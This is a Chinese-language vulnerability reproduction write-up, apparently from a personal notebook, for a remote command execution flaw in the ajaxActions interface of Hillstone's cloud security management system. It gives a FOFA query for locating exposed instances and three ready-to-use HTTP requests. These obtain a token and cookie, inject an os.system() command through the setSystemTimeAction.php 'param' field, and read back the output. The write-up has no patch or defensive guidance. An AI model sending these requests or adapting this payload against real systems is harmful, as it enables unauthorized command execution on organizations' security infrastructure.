# 山石网科云鉴安全管理系统ajaxActions接口处存在远程命令执行漏洞

# 一、产品简介
<font style="color:rgb(51, 51, 51);">山石网科是中国网络安全行业的技术创新领导厂商</font><sup><font style="color:rgb(51, 102, 204);"> </font></sup><font style="color:rgb(51, 51, 51);">，自成立以来为金融、政府、互联网、教育、医疗卫生等行业的超过26000家客户提供高效、稳定的安全防护服务。山石网科云鉴安全管理系统ajaxActions接口处存在远程命令执行漏洞,可导致系统被攻击者执行任意命令。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 山石网科云鉴安全管理系统

# <font style="color:rgb(0, 0, 0);">三、资产测绘</font>
+ fofa`body=山石云鉴主机安全管理系统||icon_hash="572290418"`
+ 特征

![1715078394101-31b6a8b4-b52f-42ab-8636-c684e2531bb7.png](./img/wxEwBAW_TIPk5zJS/1715078394101-31b6a8b4-b52f-42ab-8636-c684e2531bb7-365277.png)

# 四、漏洞复现
1. 获取token与cookie

```plain
GET /master/ajaxActions/getTokenAction.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
```

![1715157818803-e44a7f91-955e-4399-a150-3f3d7ecdd258.png](./img/wxEwBAW_TIPk5zJS/1715157818803-e44a7f91-955e-4399-a150-3f3d7ecdd258-372501.png)

2. 使用上一步获取的token与cookie执行命令

```plain
POST /master/ajaxActions/setSystemTimeAction.php?token_csrf=a64cca09285de26ca4ebfefa629edd02 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 90
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=3ovusd429biqeot6ioje7q06r0

param=os.system('echo 8888881 > /opt/var/majorsec/installation/master/runtime/img/config')
```

![1715157802540-1acb09fb-b3fc-48b6-a0fc-64f1c542d681.png](./img/wxEwBAW_TIPk5zJS/1715157802540-1acb09fb-b3fc-48b6-a0fc-64f1c542d681-368550.png)

2. 获取命令执行结果

```plain
GET /master/img/config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate, br
```

![1715157874584-965625d3-c321-4dab-87f4-fefe9baa380c.png](./img/wxEwBAW_TIPk5zJS/1715157874584-965625d3-c321-4dab-87f4-fefe9baa380c-568641.png)



> 更新: 2024-05-20 13:57:29  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ktu0gkdf8p351xdi>